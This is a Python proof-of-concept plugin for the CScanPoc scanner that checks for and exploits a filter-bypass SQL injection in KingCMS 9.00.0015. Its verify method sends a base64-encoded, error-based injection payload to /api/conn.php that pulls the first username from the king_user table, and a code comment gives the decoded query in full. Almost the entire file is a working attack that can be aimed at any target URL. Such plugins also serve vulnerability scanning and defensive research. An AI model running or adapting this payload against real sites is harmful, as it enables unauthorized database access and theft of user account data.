# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'KingCMS_0002'  # 平台漏洞编号，留空
    name = 'KingCMS 绕过过滤SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-11'  # 漏洞公布时间
    desc = '''
        KingCMS 9.00.0015版 未过滤了/**/ 导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3486/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'KingCMS'  # 漏洞应用名称
    product_version = '9.00.0015版'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd061b82c-4f6b-4f30-bf9b-a2711f308b79'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # SELECT username FROM king_user UNION SELECT 1 FROM(/**/SELECT COUNT(*),CONCAT(0x23,(/**/SELECT concat(username,0x23,md5(c))FROM king_user LIMIT 0,1),0x23,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a
            payload = "/api/conn.php?USERID=MTAwMDA%3D&data=U0VMRUNUIHVzZXJuYW1lIEZST00ga2luZ191c2VyIFVOSU9OIFNFTEVDVCAxIEZST00oLyoqL1NFTEVDVCBDT1VOVCgqKSxDT05DQVQoMHgyMywoLyoqL1NFTEVDVCBjb25jYXQodXNlcm5hbWUsMHgyMyxtZDUoYykpRlJPTSBraW5nX3VzZXIgTElNSVQgMCwxKSwweDIzLEZMT09SKFJBTkQoMCkqMikpeCBGUk9NIElORk9STUFUSU9OX1NDSEVNQS50YWJsZXMgR1JPVVAgQlkgeClh&jsoncallback=jsonp1426001109856&SIGN=9e64da1bfad93ed03ac42e0522cad92d&_=1426001137223"
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
